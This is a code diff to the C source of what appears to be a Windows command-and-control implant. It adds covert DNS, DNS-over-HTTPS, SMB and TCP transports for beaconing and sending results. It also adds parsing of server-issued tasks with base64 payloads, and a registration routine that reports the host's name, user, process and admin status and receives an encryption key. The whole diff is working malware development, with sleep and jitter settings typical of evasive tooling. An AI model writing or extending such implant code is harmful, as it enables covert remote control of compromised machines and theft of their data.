@@ -9,6 +9,10 @@
 #include <string.h>
 #include <stdio.h>
 #include "api_resolve.h"
+#include "transport_dns.h"
+#include "transport_doh.h"
+#include "transport_smb.h"
+#include "transport_tcp.h"
 
 AgentState g_agent = {0};
 
@@ -290,6 +294,12 @@ static int is_elevated(void) {
 }
 
 int agent_register(void) {
+    // Transport dispatch
+    if (strcmp(AGENT_TRANSPORT, "dns") == 0) return transport_dns_register();
+    if (strcmp(AGENT_TRANSPORT, "doh") == 0) return transport_doh_register();
+    if (strcmp(AGENT_TRANSPORT, "smb") == 0) return transport_smb_register();
+    if (strcmp(AGENT_TRANSPORT, "tcp") == 0) return transport_tcp_register();
+
     char exe_name[MAX_PATH] = "agent.exe";
     if (GetModuleFileNameA(NULL, exe_name, sizeof(exe_name)) > 0) {
         char *slash = strrchr(exe_name, '\\');
@@ -353,6 +363,12 @@ int agent_register(void) {
 
 AgentTask* agent_beacon(int *count) {
     *count = 0;
+    // Transport dispatch
+    if (strcmp(AGENT_TRANSPORT, "dns") == 0) return transport_dns_beacon(count);
+    if (strcmp(AGENT_TRANSPORT, "doh") == 0) return transport_doh_beacon(count);
+    if (strcmp(AGENT_TRANSPORT, "smb") == 0) return transport_smb_beacon(count);
+    if (strcmp(AGENT_TRANSPORT, "tcp") == 0) return transport_tcp_beacon(count);
+
     if (!g_agent.has_key) return NULL;
 
     char path[256];
@@ -464,6 +480,19 @@ static char* json_escape(const char *s) {
 
 void agent_send_result_admin(long long task_id, const char *output,
                               const char *error, int is_admin) {
+    // Transport dispatch
+    if (strcmp(AGENT_TRANSPORT, "dns") == 0) {
+        transport_dns_send_result(task_id, output, error); return;
+    }
+    if (strcmp(AGENT_TRANSPORT, "doh") == 0) {
+        transport_doh_send_result(task_id, output, error, is_admin); return;
+    }
+    if (strcmp(AGENT_TRANSPORT, "smb") == 0) {
+        transport_smb_send_result(task_id, output, error, is_admin); return;
+    }
+    if (strcmp(AGENT_TRANSPORT, "tcp") == 0) {
+        transport_tcp_send_result(task_id, output, error, is_admin); return;
+    }
     char *esc_out = json_escape(output ? output : "");
     char *esc_err = json_escape(error  ? error  : "");
     size_t json_sz = strlen(esc_out) + strlen(esc_err) + 128;
@@ -514,4 +543,99 @@ uint8_t* agent_download_file(const char *filename, size_t *out_len) {
     uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, resp, resp_len, out_len);
     free(resp);
     return plain;
+}
+
+// ── Public JSON helpers (for transport modules) ───────────────────────────────
+
+int agent_json_str(const char *json, const char *key, char *out, size_t out_sz) {
+    return json_str(json, key, out, out_sz);
+}
+char* agent_json_str_alloc(const char *json, const char *key) {
+    return json_str_alloc(json, key);
+}
+long long agent_json_int(const char *json, const char *key) {
+    return json_int(json, key);
+}
+const char* agent_json_next_obj(const char *p, const char **end) {
+    return next_obj(p, end);
+}
+
+// Parse decrypted tasks JSON {"tasks":[...]} into an AgentTask array.
+AgentTask* agent_parse_tasks(const uint8_t *plain, size_t plain_len, int *count) {
+    *count = 0;
+    (void)plain_len;
+    const char *tasks_start = strstr((const char*)plain, "\"tasks\"");
+    if (!tasks_start) return NULL;
+    tasks_start = strchr(tasks_start, '[');
+    if (!tasks_start) return NULL;
+    tasks_start++;
+
+    int cap = 16;
+    AgentTask *tasks = (AgentTask*)calloc(cap, sizeof(AgentTask));
+    if (!tasks) return NULL;
+
+    const char *p = tasks_start;
+    const char *obj_end;
+    while ((p = next_obj(p, &obj_end)) != NULL) {
+        size_t obj_len = obj_end - p + 1;
+        char *obj = (char*)malloc(obj_len + 1);
+        if (!obj) break;
+        memcpy(obj, p, obj_len); obj[obj_len] = '\0';
+
+        if (*count >= cap) {
+            cap *= 2;
+            AgentTask *nt = (AgentTask*)realloc(tasks, cap * sizeof(AgentTask));
+            if (!nt) { free(obj); break; }
+            tasks = nt;
+        }
+        AgentTask *t = &tasks[*count];
+        t->id = json_int(obj, "id");
+        json_str(obj, "type", t->type, sizeof(t->type));
+        t->args = json_str_alloc(obj, "args");
+        t->payload = NULL; t->payload_len = 0;
+        char *pl_b64 = json_str_alloc(obj, "payload");
+        if (pl_b64 && pl_b64[0]) t->payload = b64_decode(pl_b64, &t->payload_len);
+        free(pl_b64); free(obj);
+        (*count)++;
+        p = obj_end + 1;
+        if (*p == ']') break;
+    }
+    return tasks;
+}
+
+// HTTP-only registration — used by DoH which delegates registration to HTTP.
+int agent_http_register(void) {
+    char exe_name[MAX_PATH] = "agent.exe";
+    if (GetModuleFileNameA(NULL, exe_name, sizeof(exe_name)) > 0) {
+        char *sl = strrchr(exe_name, '\\');
+        if (sl) memmove(exe_name, sl + 1, strlen(sl + 1) + 1);
+    }
+    char hostname[128] = "UNKNOWN", username[128] = "UNKNOWN";
+    GetComputerNameA(hostname, &(DWORD){sizeof(hostname)});
+    GetUserNameA(username,     &(DWORD){sizeof(username)});
+    char body[1024];
+    snprintf(body, sizeof(body),
+        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
+        "\"pid\":%lu,\"transport\":\"%s\","
+        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"language\":\"c\"}",
+        hostname, username, (unsigned long)GetCurrentProcessId(),
+        AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
+        is_elevated() ? "true" : "false");
+    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
+    if (!http_do("POST", "/register", (const uint8_t*)body, strlen(body),
+                 &resp, &resp_len, &status) || status != 200 || !resp)
+    { free(resp); return 0; }
+    char agent_id[64] = {0}, aes_key_b64[128] = {0};
+    json_str((char*)resp, "agent_id", agent_id, sizeof(agent_id));
+    json_str((char*)resp, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
+    free(resp);
+    if (!agent_id[0] || !aes_key_b64[0]) return 0;
+    size_t key_len = 0;
+    uint8_t *key = b64_decode(aes_key_b64, &key_len);
+    if (!key || key_len < 32) { free(key); return 0; }
+    strncpy(g_agent.agent_id, agent_id, sizeof(g_agent.agent_id) - 1);
+    memcpy(g_agent.aes_key, key, 32);
+    g_agent.has_key = 1;
+    free(key);
+    return 1;
 }
